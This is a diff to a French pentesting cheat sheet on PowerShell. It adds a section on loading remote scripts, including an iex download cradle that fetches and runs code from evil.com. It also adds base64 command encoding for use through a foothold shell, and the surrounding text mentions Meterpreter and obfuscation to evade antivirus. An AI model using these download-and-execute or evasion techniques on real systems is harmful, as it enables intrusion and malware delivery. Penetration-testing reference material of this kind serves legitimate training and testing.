@@ -40,6 +40,27 @@ Pour faire du formatting / output:
 Get-Process | Format-List -Property Threads, SessionId # Affiche le résultat sous forme de liste en se limitant à certaines informations
 ```
 
+Charger un script distant:
+
+``` powershell
+iex (new-object net.webclient).downloadstring('file:///C:\\Tools\\Powersploit\\Powersploit.psd1')
+iex (new-object net.webclient).downloadstring('https://evil.com/powersploit.psd1')
+```
+
+Encoder des commandes pour éviter certains problèmes avec les quotes & cie (notamment quand on a un shell via un MS-SQL ou autre):
+
+``` powershell
+PS C:\Users\user> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("net user"))
+bgBlAHQAIAB1AHMAZQByAA==
+PS C:\Users\user> powershell -e bgBlAHQAIAB1AHMAZQByAA==
+
+comptes d’utilisateurs de \\Computer
+
+-------------------------------------------------------------------------------
+Administrateur           DefaultAccount           Invité
+La commande s’est terminée correctement.
+```
+
 ## Meterpreter
 
 Il est possible d'utiliser powershell à partir d'un meterpreter:
@@ -48,19 +69,6 @@ load powershell
 ```
 
 Voir [Meterpreter New Windows PowerShell Extension](http://www.darkoperator.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension)
-
-## Execution Policy
-
-Il est possible de contourner l'execution policy ("\[...\] running scripts is disabled on this system."):
-
-``` powershell
-iex (new-object net.webclient).downloadstring('file:///C:\\Tools\\Powersploit\\Powersploit.psd1')
-iex (new-object net.webclient).downloadstring('https://evil.com/powersploit.psd1')
-```
-
--   Si powershell.exe est bloqué: il est possible d'utiliser **Not Powershell** (https://github.com/Ben0xA/nps)
-
-Il est très important de comprendre que l'execution policy n'est pas un mécanisme de sécurité ! (Microsoft le dit lui-même)
 
 ## Obfuscation
 Il est possible d'obfusquer du code powershell pour contourner certains antivirus qui bloquent powersploit & cie. L'outil [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) permet de faire ceci facilement. Il est cependant possible de bloquer les codes obfusqués (une analyse statistique permet de détecter les codes non légitimes).
